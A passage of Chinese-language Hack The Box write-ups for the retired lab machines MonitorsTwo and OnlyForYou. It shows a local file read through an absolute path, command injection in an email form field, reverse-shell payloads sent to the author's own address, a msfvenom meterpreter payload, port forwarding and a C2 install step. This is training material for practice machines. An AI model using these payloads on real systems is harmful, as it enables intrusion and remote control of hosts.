<p>\u6ce8\u610f\uff0c\u7531\u4e8ePoC\u7684\u811a\u672c\u6267\u884c\u5b8c\u4e4b\u540e\u4f1a\u81ea\u52a8\u9000\u51fashell\u3002\u6240\u4ee5\u8981\u4fee\u6539\u4e00\u4e0bPoC\u91cc\u5bf9\u5e94\u4f4d\u7f6e\u7684\u547d\u4ee4\uff0c\u4f7f\u5176\u6267\u884c\u53cd\u5411shell\u5373\u53ef\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#flag-root","title":"flag: root","text":"<pre><code>\u2514\u2500$ nc -lvnp 4445 \nlistening on [any] 4445 ...\nconnect to [10.xx .xx.xx] from (UNKNOWN) [10.10.11.211] 56864\n\nbash-5.1# id\nid\nuid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)\nbash-5.1# cd /root\ncd /root\nbash-5.1# ls\nls\ncacti\nroot.txt\nbash-5.1# cat root.txt\ncat root.txt\ndfbf\u2026\u2026\u2026\u202652af\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-MonitorsTwo/#_5","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2023/05/15</p> <p>\u867d\u7136\u4e5f\u6709\u5361\u4f4f\u7684\u5730\u65b9\uff0c\u4f46\u662f\u603b\u4f53\u6765\u8bf4\u786e\u5b9e\u4e0d\u96be\u3002 \u521d\u59cb\u8bbf\u95ee\u5f88\u5bb9\u6613\u5c31\u80fd\u987a\u7740web\u670d\u52a1\u7684\u7248\u672c\u53f7\u53bb\u627eexp\uff0c\u4e0d\u8fc7\u8fd8\u662f\u611f\u53d7\u5230\u4e86\u81ea\u5df1\u8fd9\u4e2a\u811a\u672c\u5c0f\u5b50\u7684\u6c34\u5e73\uff0c\u62ff\u7740exp\u5c31\u60f3\u76f4\u63a5\u7528\uff0c\u6ca1\u592a\u8003\u8651\u4e86\u89e3\u6f0f\u6d1e\u539f\u7406\u3002\u4e0d\u8fc7\u81ea\u5df1\u786e\u5b9eweb\u65b9\u9762\u8f83\u5f31\uff0c\u4ee3\u7801\u7684\u9605\u8bfb\u91cf\u4e5f\u5c11\uff0c\u611f\u89c9\u770bCVE\u6587\u7ae0\u5543\u5f88\u4e45\u90fd\u4e0d\u4e00\u5b9a\u53cd\u5e94\u8fc7\u6765\u539f\u6765\u662f\u7528X-Forwarded-For\u7b49\u4e8e\u73af\u56deIP\u53bb\u7ed5\u8fc7\u9a8c\u8bc1\u3002</p> <p>\u4e00\u5f00\u59cb\u5728kali\u641c\u6f0f\u6d1e\u7684\u65f6\u5019\u6ca1\u641c\u51fa\u6765\u89c9\u5f97\u5f88\u5947\u602a\uff0c\u624d\u60f3\u8d77\u6765\u5e94\u8be5\u662f\u6709\u4e2a\u6570\u636e\u5e93\u4e4b\u7c7b\u7684\u9700\u8981\u66f4\u65b0\uff1f\u4e8e\u662f\u4e5f\u987a\u4fbf\u66f4\u65b0\u4e86ExploitDB\u548cmetasplit\uff1a</p> <ul> <li><code>searchsploit -u</code></li> <li><code>apt update; apt install metasploit-framework</code></li> </ul> <p>\u7136\u540e\u5c31\u662fdocker\u5bb9\u5668\uff0c\u6700\u521d\u8fdb\u53bb\u7684\u65f6\u5019\u60f3\u770bIP\u53d1\u73b0\u6ca1\u6709\u5b89\u88c5<code>ifconfig</code>\u547d\u4ee4\uff0c\u7136\u540e\u641c\u4e86\u4e9b\u66ff\u4ee3\u547d\u4ee4\u5982<code>ip a</code>\u4e5f\u6ca1\u6709\u3002\u76f4\u63a5\u5f00\u6446\uff0c\u8981\u4e0d\u662f\u5076\u7136\u8fde\u4e0aMeterpreter\u8dd1\u4e86\u4e0b<code>sysinfo</code>\uff0c\u4e5f\u4e0d\u77e5\u9053\u81ea\u5df1\u4f1a\u8fc7\u591a\u4e45\u624d\u53d1\u73b0\u8eab\u5904\u5bb9\u5668\u4e2d\u2026\u2026 \u4ee5\u53ca\u4e00\u76f4\u90fd\u662f\u8d70\u4e00\u6b65\u60f3\u4e00\u6b65\uff0c\u7531\u4e8e\u6ca1\u6709\u597d\u597d\u5730\u63a2\u7d22\u4fe1\u606f\u800c\u88ab\u9a97\u8fdb\u5154\u5b50\u6d1e\uff0c\u767d\u767d\u5728docker\u91cc\u62ff\u4e86\u6ca1\u7528\u7684root\u6743\u9650\u3002</p> <p>\u6700\u540e\u4e00\u4e2a\u63d0\u6743\u7684\u5229\u7528\u5b9e\u9645\u4e0a\u4e0d\u96be\u3002\u611f\u89c9\u6240\u6709\u96be\u70b9\u90fd\u5728\u5982\u4f55\u53d1\u73b0\u90a3\u6761\u63d0\u793a\u2026\u2026SSH\u767b\u9646\u540e\u7684\u4fe1\u606f\uff0c\u4e00\u76f4\u4ee5\u6765\u90fd\u662f\u65e0\u89c6\u7684\u554a\u2026\u2026\u8fd9\u53f0\u673a\u5668\u7684\u521b\u4f5c\u8005\u7b80\u76f4\u5c31\u662f\u5229\u7528\u4e86\u4eba\u7684\u8fd9\u4e2a\u4e60\u60ef\uff08\u7b11\uff09\u3002\u4ee5\u53ca\u5982\u5b98\u65b9\u8bba\u575b\u6709\u4eba\u8bf4\u7684\u90a3\u6837\uff0c\u201cWhat happens in Vegas does not always stay in Vegas\u201d\uff0c\u6709\u70b9\u610f\u601d\u3002</p> <p>\u603b\u7684\u6765\u8bf4\uff0c\u4fe1\u606f\u6536\u96c6\u8981\u4ed4\u7ec6\uff01</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-OnlyForYou/","title":"HTB-OnlyForYou","text":"","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#_1","title":"\u626b\u63cf","text":"<p>\u81ea\u7528\u811a\u672c\uff1a\u5de5\u4f5c\u6d41</p> <pre><code>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n</code></pre>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#_2","title":"\u6f0f\u6d1e\u5206\u6790","text":"","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#80only4youhtb","title":"80\u7aef\u53e3\uff1aonly4you.htb","text":"<ul> <li>robots.txt\uff1a\u65e0</li> <li>\u7f51\u9875\u529f\u80fd\uff1a\u80fd\u53d1\u9001\u53cd\u9988\uff1f</li> <li>\u5b50\u57df\u679a\u4e3e\uff1abeta.only4you.htb</li> </ul>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#betaonly4youhtb","title":"\u5b50\u57df\uff1abeta.only4you.htb","text":"<p>\u80fd\u4e0b\u8f7d\u5230\u4e00\u4e2aflask\u9879\u76ee\u6e90\u7801\u3002\u53ef\u80fd\u662f\u8fd9\u4e2abeta\uff0c\u4e5f\u53ef\u80fd\u662f\u4e3b\u7ad9\uff1f\u603b\u4e4b\u5148\u770b\u770b\u6e90\u7801\u3002</p> <pre><code>\u2514\u2500$ cat app.py                    \nfrom flask import Flask, request, send_file, render_template, flash, redirect, send_from_directory\nimport os, uuid, posixpath\nfrom werkzeug.utils import secure_filename\nfrom pathlib import Path\nfrom tool import convertjp, convertpj, resizeimg\n\u2026\u2026\n@app.route('/download', methods=['POST'])\ndef download():\n    image = request.form['image']\n    filename = posixpath.normpath(image) \n    if '..' in filename or filename.startswith('../'):\n        flash('Hacking detected!', 'danger')\n        return redirect('/list')\n    if not os.path.isabs(filename):\n        filename = os.path.join(app.config['LIST_FOLDER'], filename)\n    try:\n        if not os.path.isfile(filename):\n            flash('Image doesn\\'t exist!', 'danger')\n            return redirect('/list')\n    except (TypeError, ValueError):\n        raise BadRequest()\n    return send_file(filename, as_attachment=True)\n\u2026\u2026\nif __name__ == '__main__':\n    app.run(host='127.0.0.1', port=80, debug=False)\n</code></pre>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#lfi","title":"\u53d1\u73b0\u5b50\u57dfLFI","text":"<p>\u6ce8\u610f\u5230\u6e90\u7801\u91cc'/download'\u8def\u7531\u7684\u90e8\u5206\uff0c\u6709\u9632\u6b62\u76ee\u5f55\u904d\u5386\u7684\u4ee3\u7801\uff0c\u4e0d\u8fc7\u8bd5\u4e86\u4e0b\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u53ef\u4ee5\u76f4\u63a5\u5199\u7edd\u5bf9\u8def\u5f84\u8bbf\u95ee\u76ee\u6807\u6587\u4ef6\u3002 \u540e\u6765\u6839\u636e0xdf\u7684WP\uff0c\u539f\u6765\u662fpython\u7684<code>os.path.join</code>\u4ee3\u7801\u6709\u70b9\u5fae\u5999\u7684\u667a\u80fd\u2014\u2014\u5982\u679c\u76f4\u63a5\u5199\u7edd\u5bf9\u8def\u5f84\uff0c\u5219\u4f1a\u5ffd\u7565\u524d\u9762join\u7684\u90e8\u5206\uff0c\u76f4\u63a5\u4ece\u7edd\u5bf9\u8def\u5f84\u7ee7\u7eedjoin\u3002\uff08python\u6587\u6863\uff09</p> <p>\u7531\u4e8e\u76ee\u6807\u662fnginx\u670d\u52a1\u5668\uff0c\u770b\u4e00\u773cnginx\u914d\u7f6e\uff0c\u7136\u540e\u770b\u770b\u5b50\u57df\u914d\u7f6e\u3002 \u8bf7\u6c42\uff1a <pre><code>POST /download HTTP/1.1\nHost: beta.only4you.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 38\nOrigin: http://beta.only4you.htb\nConnection: close\nReferer: http://beta.only4you.htb/list\nUpgrade-Insecure-Requests: 1\n\nimage=/etc/nginx/sites-enabled/default\n</code></pre></p> <p>\u54cd\u5e94\uff1a <pre><code>server {\n    listen 80;\n    return 301 http://only4you.htb$request_uri;\n}\n\nserver {\n    listen 80;\n    server_name only4you.htb;\n\n    location / {\n                include proxy_params;\n                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;\n    }\n}\n\nserver {\n    listen 80;\n    server_name beta.only4you.htb;\n\n        location / {\n                include proxy_params;\n                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;\n        }\n}\n</code></pre></p> <p>\u6ce8\u610f\u5230 <code>/var/www/only4you.htb/</code>\uff0c\u5e94\u8be5\u662f\u8fd9\u4e2a\u9879\u76ee\u7684\u6587\u4ef6\u5939\u3002\u800c\u53c2\u8003\u6211\u4eec\u5728 <code>beta.only4you.htb</code> \u4e0b\u8f7d\u7684\u6e90\u7801\uff0c\u53ef\u4ee5\u5927\u81f4\u731c\u6d4b\u4e3b\u7ad9\u7684\u9879\u76ee\u6587\u4ef6\u5939\u91cc\u4e5f\u6709\u4e2a <code>app.py</code>\u3002</p> <p>payload\uff1a<code>image=/var/www/only4you.htb/app.py</code> \u54cd\u5e94\uff1a <pre><code>from flask import Flask, render_template, request, flash, redirect\nfrom form import sendmessage\nimport uuid\n\napp = Flask(__name__)\napp.secret_key = uuid.uuid4().hex\n\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'POST':\n        email = request.form['email']\n        subject = request.form['subject']\n        message = request.form['message']\n        ip = request.remote_addr\n\u2026\u2026\n</code></pre></p> <p>\u7b2c\u4e8c\u884c\u4f3c\u4e4e\u5bfc\u5165\u4e86\u4e00\u4e2a\u81ea\u5b9a\u4e49\u5305\uff1a<code>from form import sendmessage</code> \u8bf7\u6c42\u4e00\u4e0b\u770b\u770b\uff0c\u786e\u5b9e\u6709\u3002\u8fd9\u597d\u50cf\u662f\u4e3b\u7ad9\u90a3\u4e2a\u53d1\u9001\u53cd\u9988\u7684\u8868\u5355\uff1a</p> <p>payload\uff1a<code>image=/var/www/only4you.htb/form.py</code> \u54cd\u5e94\uff1a <pre><code>import smtplib, re\nfrom email.message import EmailMessage\nfrom subprocess import PIPE, run\nimport ipaddress\n\ndef issecure(email, ip):\n    if not re.match(\"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\\.[A-Z|a-z]{2,})\", email):\n        return 0\n    else:\n        domain = email.split(\"@\", 1)[1]\n        result = run([f\"dig txt {domain}\"], shell=True, stdout=PIPE)\n        output = result.stdout.decode('utf-8')\n        if \"v=spf1\" not in output:\n            return 1\n        else:\n            domains = []\n            ips = []\n            if \"include:\" in output:\n                dms = ''.join(re.findall(r\"include:.*\\.[A-Z|a-z]{2,}\", output)).split(\"include:\")\n                dms.pop(0)\n                for domain in dms:\n                    domains.append(domain)\n                while True:\n                    for domain in domains:\n                        result = run([f\"dig txt {domain}\"], shell=True, stdout=PIPE)\n                        output = result.stdout.decode('utf-8')\n                        if \"include:\" in output:\n                            dms = ''.join(re.findall(r\"include:.*\\.[A-Z|a-z]{2,}\", output)).split(\"include:\")\n                            domains.clear()\n                            for domain in dms:\n                                domains.append(domain)\n                        elif \"ip4:\" in output:\n                            ipaddresses = ''.join(re.findall(r\"ip4:+[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+[/]?[0-9]{2}\", output)).split(\"ip4:\")\n                            ipaddresses.pop(0)\n                            for i in ipaddresses:\n                                ips.append(i)\n                        else:\n                            pass\n                    break\n            elif \"ip4\" in output:\n                ipaddresses = ''.join(re.findall(r\"ip4:+[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+[/]?[0-9]{2}\", output)).split(\"ip4:\")\n                ipaddresses.pop(0)\n                for i in ipaddresses:\n                    ips.append(i)\n            else:\n                return 1\n        for i in ips:\n            if ip == i:\n                return 2\n            elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):\n                return 2\n            else:\n                return 1\n\ndef sendmessage(email, subject, message, ip):\n    status = issecure(email, ip)\n    if status == 2:\n        msg = EmailMessage()\n        msg['From'] = f'{email}'\n        msg['To'] = 'info@only4you.htb'\n        msg['Subject'] = f'{subject}'\n        msg['Message'] = f'{message}'\n\n        smtp = smtplib.SMTP(host='localhost', port=25)\n        smtp.send_message(msg)\n        smtp.quit()\n        return status\n    elif status == 1:\n        return status\n    else:\n        return status\n</code></pre></p> <p>\u6ce8\u610f\u8fd9\u91cc\u9762\u5bfc\u5165\u4e86 <code>subprocess.run()</code>\u3002\u5173\u4e8erun\u51fd\u6570\uff0c\u9ed8\u8ba4\u662fpython\u6267\u884c\u547d\u4ee4\uff0c\u4f46\u662f\u4e5f\u6709\u4e2a\u53c2\u6570 <code>shell=True</code>\uff0c\u53ef\u4ee5\u8ba9\u5b83\u7528shell\u6267\u884c\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528shell\u7684\u529f\u80fd\uff1a\u901a\u914d\u7b26\u3001\u91cd\u5b9a\u5411\u7b26\u7b49\u3002 </p> <p>subprocess.run([\"ls\", \"-l\"]) subprocess.run(\"ls -l\", shell=True) shell=True\uff0c\u9ed8\u8ba4\u662f\u7528\u201c/bin/sh\u201d</p> <p>\u800c\u8fd9\u91cc\u9762\u6b63\u597d\u6709\u4e2a <code>result = run([f\"dig txt {domain}\"], shell=True, stdout=PIPE)</code>\uff0c\u5176\u4e2d\u7684 <code>domain</code> \u53c2\u6570\u662f\u5728\u5224\u65ad\u5b8c\u6b63\u5219\u4e4b\u540e\u76f4\u63a5\u4ece <code>email</code> \u53c2\u6570\u5207\u7247\u5f97\u6765\uff0c\u672a\u8fdb\u884c\u7279\u522b\u6e05\u7406\u3002\uff08\u672c\u610f\u53ef\u80fd\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\u4ee5\u201c$\u201d\u7ed3\u5c3e\uff0c\u6216\u8005 <code>domain</code> \u53c2\u6570\u53d6\u6b63\u5219\u5339\u914d\u5230\u7684\u90e8\u5206\uff09  </p> <p>domain = email.split(\"@\", 1)[1]</p> <p>\u6240\u4ee5\u53ef\u4ee5\u5c1d\u8bd5\u6ce8\u5165\u3002\u53ea\u662f\u6ce8\u610f\u8981\u5339\u914d\u5230email\u53c2\u6570\u7684\u6b63\u5219\u8868\u8fbe\u5f0f <code>re.match(\"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\\.[A-Z|a-z]{2,})\", email)</code>\uff0c\u4ee5\u8ba9\u51fd\u6570\u4e0d\u76f4\u63a5 <code>return 0</code> \u7ed3\u675f\u3002\u4e0d\u8fc7\u8fd9\u662f\u5f88\u5e38\u89c4\u7684email\u683c\u5f0f\u5c31\u662f\u4e86\u3002</p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#_3","title":"\u8f6c\u6218\u4e3b\u7ad9\u8868\u5355\u6ce8\u5165","text":"<p>burp\u91cc\u9996\u5148\u7528ping\u9a8c\u8bc1\u4e00\u4e0b\uff0c\u6536\u5230ping\u3002\uff08\u4e0d\u8fc7\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u5f00\u5934\u6709\u51e0\u884c\u7531\u6211kali\u53d1\u8d77\u7684\u8bf7\u6c42\uff1f :2024/5/18:\u56e0\u4e3a\u662f\u6211\u8fde\u63a5\u7f51\u9875\u53d1\u9001payload\uff0c\u5f00\u5934\u51e0\u884c\u662f\u8fde\u63a5\u7f51\u9875\u65f6\u7684\u4e09\u6b21\u63e1\u624b\u4ee5\u53ca\u53d1\u9001\u6570\u636e\u5305\uff08S\u4ee3\u8868SYN\uff0c.\u4ee3\u8868ACK\uff0cP\u4ee3\u8868PSH\uff09\u3002\uff09</p> <p>payload\uff1a<code>name=admin&amp;email=admin@test.lab;ping 10.xx.xx.xx&amp;subject=asdf&amp;message=asdf</code> \u54cd\u5e94\uff1a <pre><code>$ sudo tcpdump -i tun0\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes\n03:53:42.830312 IP 10.xx.xx.xx.57322 &gt; only4you.htb.http: Flags [S], seq 3023393082, win 64240, options [mss 1460,sackOK,TS val 1866577499 ecr 0,nop,wscale 7], length 0\n03:53:42.910763 IP only4you.htb.http &gt; 10.xx.xx.xx.57322: Flags [S.], seq 3296966782, ack 3023393083, win 65160, options [mss 1337,sackOK,TS val 1624306828 ecr 1866577499,nop,wscale 7], length 0\n03:53:42.910812 IP 10.xx.xx.xx.57322 &gt; only4you.htb.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 1866577580 ecr 1624306828], length 0\n03:53:42.910972 IP 10.xx.xx.xx.57322 &gt; only4you.htb.http: Flags [P.], seq 1:672, ack 1, win 502, options [nop,nop,TS val 1866577580 ecr 1624306828], length 671: HTTP: POST / HTTP/1.1\n03:53:42.991151 IP only4you.htb.http &gt; 10.xx.xx.xx.57322: Flags [.], ack 672, win 504, options [nop,nop,TS val 1624306908 ecr 1866577580], length 0\n03:53:50.371090 IP only4you.htb &gt; 10.xx.xx.xx: ICMP echo request, id 4, seq 1, length 64\n03:53:50.371122 IP 10.xx.xx.xx &gt; only4you.htb: ICMP echo reply, id 4, seq 1, length 64\n03:53:51.372118 IP only4you.htb &gt; 10.xx.xx.xx: ICMP echo request, id 4, seq 2, length 64\n03:53:51.372133 IP 10.xx.xx.xx &gt; only4you.htb: ICMP echo reply, id 4, seq 2, length 64\n03:53:52.374083 IP only4you.htb &gt; 10.xx.xx.xx: ICMP echo request, id 4, seq 3, length 64\n03:53:52.374100 IP 10.xx.xx.xx &gt; only4you.htb: ICMP echo reply, id 4, seq 3, length 64\n03:53:53.375395 IP only4you.htb &gt; 10.xx.xx.xx: ICMP echo request, id 4, seq 4, length 64\n03:53:53.375419 IP 10.xx.xx.xx &gt; only4you.htb: ICMP echo reply, id 4, seq 4, length 64\n^C\n13 packets captured\n13 packets received by filter\n0 packets dropped by kernel\n</code></pre></p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#initial-access","title":"Initial Access","text":"<p>\u8bd5\u4e86\u597d\u51e0\u4e2apayload\u90fd\u6ca1\u53cd\u5e94\uff0c\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u2026\u2026\u5982\u8fd9\u4e2a\uff1a<code>/bin/bash -i &gt;&amp; /dev/tcp/10.xx.xx.xx/4444 0&gt;&amp;1</code></p> <p>\u901a\u8fc7\u4e0b\u9762\u8fd9\u4e2apayload\u6210\u529fget shell\uff1a payload\uff1a<code>name=admin&amp;email=admin@test.lab;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.xx.xx.xx%204444%20%3E%2Ftmp%2Ff&amp;subject=asdf&amp;message=asdf</code> \u540e\u9762\u8bd5\u4e86\u4e0bpython3\u7684\u4e5f\u53ef\u4ee5</p> <pre><code>\u2514\u2500$ nc -lvnp 4444\nlistening on [any] 4444 ...\nconnect to [10.xx.xx.xx] from (UNKNOWN) [10.10.11.210] 33262\nbash: cannot set terminal process group (1014): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@only4you:~/only4you.htb$  id\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre> <p>\u770b\u4e86\u4e0b\u7528\u6237flag\u4e0d\u5728\u8fd9\u4e2a\u7528\u6237\u3002home\u76ee\u5f55\u6709\u4e24\u4e2a\u7528\u6237\uff1adev\u3001john\u3002 \u59d1\u4e14\u770b\u4e86\u4e0bSUID\u7b49\uff0c\u6ca1\u53d1\u73b0\u80fd\u63d0\u6743\u3002\u7ee7\u7eed\u63a2\u7d22\u671f\u671b\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u3002</p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#_4","title":"\u63a2\u7d22","text":"<p>\u679a\u4e3e\u5230\u672c\u5730\u5f00\u653e\u7aef\u53e3\u65f6\uff0c\u53d1\u73b0\u5f00\u7740\u633a\u591a\u670d\u52a1\uff1a <pre><code>www-data@only4you:~/only4you.htb$ netstat -anot\nnetstat -anot\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       Timer\ntcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0     14 10.10.11.210:33262      10.xx.xx.xx:4444        ESTABLISHED on (0.28/0/0)\ntcp        0      1 10.10.11.210:49654      8.8.8.8:53              SYN_SENT    on (0.30/2/0)\ntcp        0      0 127.0.0.1:3306          127.0.0.1:49928         TIME_WAIT   timewait (13.30/0/0)\ntcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      off (0.00/0/0)\ntcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      off (0.00/0/0)\ntcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)\n</code></pre></p> <p>\u90fdcurl\u770b\u770b\u3002\u5148 <code>curl -I</code> \u770b\u770b\u54cd\u5e94\u62a5\u5934</p> <ul> <li>127.0.0.1:8001\uff0c302\uff0c\u4e0d\u8fc7Location\u5b57\u6bb5\u4f1a\u91cd\u5b9a\u5411\u5230 <code>/login</code>\uff0c\u90a3\u8fb9\u4f1a\u54cd\u5e94200\u3002</li> <li>127.0.0.1:33060\uff0c<code>curl: (1) Received HTTP/0.9 when not allowed</code>\uff0c\u62a5\u9519\uff1f</li> <li>127.0.0.1:3306\uff0c\u540c\u4e0a\u3002\u4e0d\u8fc7\u4e00\u822c\u90fd\u662fmysql\u3002</li> <li>127.0.0.1:3000\uff0c200\u3002</li> <li>127.0.0.1:7687\uff0c<code>curl: (52) Empty reply from server</code></li> <li>127.0.0.1:7474\uff0c200\u3002</li> </ul> <p>\u6709\u51e0\u4e2a\u54cd\u5e94200\u7684\u672c\u6765\u60f3curl\u4e00\u4e0b\u770b\u770b\u7f51\u9875\u6e90\u7801\uff0c\u4e0d\u8fc7\u4e4b\u540e\u8981\u8fdb\u884c\u66f4\u6df1\u7684\u5206\u6790\u7684\u8bdd\u5149\u9760curl\u8fd8\u662f\u597d\u9ebb\u70e6\u3002\u770b\u770b\u80fd\u4e0d\u80fd\u5f04\u4e2a\u7aef\u53e3\u8f6c\u53d1\u4ec0\u4e48\u7684\u2026\u2026</p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#_5","title":"\u7aef\u53e3\u8f6c\u53d1","text":"<ul> <li>\u4e4b\u524d\u4e00\u76f4\u542c\u8bf4frp\u3001Ngrok\u7b49</li> <li>\u6700\u8fd1\u8fd8\u77e5\u9053\u6709\u4e2aSliver C2\u597d\u50cf\u662f\u5bf9\u6807CS\u7684\uff1f</li> <li>\u540e\u6765\u770bWP\u6709\u4eba\u7528chisel</li> <li>\u4ee5\u53ca\u7fa4\u91cc\u6709\u5e08\u5085\u8bf4\u539f\u751fmetasploit\u6709\u70b9\u9e21\u808b\uff0c\u63a8\u8350Viper - \u70ab\u5f69\u86c7</li> <li>\u81ea\u5df1\u6bd4\u8f83\u719f\u6089\u7684\u662fmetasploit\u5c31\u5148\u8bd5\u8bd5\u8fd9\u4e2a</li> </ul>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#metasploit","title":"metasploit","text":"<p>\u9996\u5148\u751f\u6210payload\uff1a <pre><code>\u2514\u2500$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.xx.xx.xx LPORT=6666 -f elf &gt; p.elf\n</code></pre></p> <p>\u53d1\u9001\u5230\u76ee\u6807\uff0c\u6267\u884c\u540e\u914d\u7f6e\u7aef\u53e3\u8f6c\u53d1\u3002 \u8e29\u5751\uff1a<code>-L</code> \u9009\u9879\u662f\u6307\u5b9atun0\u7f51\u5361\u3002\u6700\u5f00\u59cb\u6307\u5b9a\u4e86\u73af\u56deIP\u81ea\u5df1\u90fd\u6ca1\u610f\u8bc6\u5230\u95ee\u9898\u6240\u5728\u2026\u2026\u5f53\u7136\u4e0d\u7528 <code>-L</code> \u9009\u9879\u76f4\u63a5\u76d1\u542c\u6240\u6709\u7f51\u5361\u5012\u4e5f\u884c\u3002 <pre><code>meterpreter &gt; portfwd add -L 10.xx.xx.xx -l 3000 -p 3000 -r 127.0.0.1\n[*] Forward TCP relay created: (local) 10.xx.xx.xx:3000 -&gt; (remote) 127.0.0.1:3000\n\nmeterpreter &gt; portfwd \n\nActive Port Forwards\n====================\n\n   Index  Local           Remote            Direction\n   -----  -----           ------            ---------\n   1      127.0.0.1:3000  10.xx.xx.xx:3000  Forward\n</code></pre></p> <p>\u8bd5\u4e86\u4e0b\u5012\u662f\u6210\u529f\u4e86\u3002 \u4e0d\u8fc7\u672c\u6765\u52a0\u7b2c\u4e00\u4e2a\u7aef\u53e3\u8f6c\u53d1\u8fd8\u80fd\u8bbf\u95ee\u6765\u7740\uff0c\u52a0\u4e86\u7b2c\u4e8c\u4e2a\u4e4b\u540e\uff0c\u8bbf\u95ee\u5c31\u53d8\u5f97\u5de8\u6162\uff0c\u53ef\u4ee5\u8bf4\u662f\u6ca1\u7528\u4e86\u3002\u770b\u4e86\u773c <code>netstat</code> \u4f3c\u4e4e\u90fd\u5728\u961f\u5217\u91cc\uff0c\u4e0d\u77e5\u9053\u6709\u4ec0\u4e48\u95ee\u9898\u3002 \u91cd\u7f6e\u9776\u673a\u8bd5\u4e86\u51e0\u6b21\u90fd\u8fd9\u6837\uff0c\u8981\u662f\u8fd8\u5f97\u4e00\u4e2a\u4e00\u4e2a\u6765\u5f04\u5c31\u5f88\u70e6\uff0c\u5c31\u60f3\u987a\u4fbf\u5f04\u70b9\u65b0\u4e1c\u897f\uff0c\u8bd5\u8bd5\u6574Sliver C2\u3002</p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-OnlyForYou/#sliver-c2","title":"Sliver C2","text":"<p>\u5b89\u88c5\u5f88\u7b80\u5355\uff1a </p> <p><code>curl https://sliver.sh/install|sudo bash</code> and then run <code>sliver</code></p> <ul> <li>memo\uff1a\u8fd9\u79cd\u65b9\u5f0f\u5b89\u88c5\u5373\u4e3aMultiplayer Mode<pre><code>The easiest way to setup a server for multiplayer is to use the Linux install script which will configure the server as a systemd service.\n</code></pre> </li> </ul> <p>Sliver\u7684 <code>netstat</code> \u547d\u4ee4\u8981\u663e\u793a\u5168\u8fd8\u633a\u9ebb\u70e6\u7684\u2026\u2026\u5982\u679c\u4e0d\u662f\u4e4b\u524d\u77e5\u9053\u5f00\u653e\u4e863000\u30018001\u7b49\u672c\u5730\u7aef\u53e3\u7684\u8bdd\uff0c\u4f30\u8ba1\u5c31\u4e0d\u4f1a\u6ce8\u610f\u5230\u4e86\u3002\u5bf9\u6bd4\u5e26\u9009\u9879\u548c\u4e0d\u5e26\u9009\u9879\uff1a <pre><code>sliver (SMILING_WET-BAR) &gt; netstat -4 -6 -l -n -T -u\n\n Protocol   Local Address     Foreign Address   State         PID/Program Name \n========== ================= 